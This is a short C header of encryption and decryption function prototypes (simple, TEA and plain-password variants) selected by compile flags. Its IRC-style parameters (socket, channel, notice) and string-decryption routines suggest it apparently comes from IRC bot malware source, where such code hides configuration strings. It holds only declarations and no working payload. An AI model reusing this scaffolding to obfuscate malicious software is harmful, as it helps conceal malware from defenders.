

void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key = "", DWORD keylen = 0);
#ifndef NO_CRYPT
void decryptstrings(int authsize, int versionsize);
#endif

#ifdef DUMP_ENCRYPT
void encryptstring(char *str, char *varname, SOCKET sock, char *chan, BOOL notice);
void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL notice);
#endif

#ifdef SIMPLE_CRYPT
char *decrypt(char *str,int key);
char *encrypt(char *str,int key);
#endif

#ifdef TEA_CRYPT
void code(long *data, long *key);
void decode(long *data, long *key);
void codestr(char *datastr, char *keystr);
void decodestr(char *datastr, char *keystr);
#endif

#ifdef PLAIN_CRYPT
char *EncryptPassword(char *password, char *key);
char *DecryptPassword(char *password, char *key);
#endif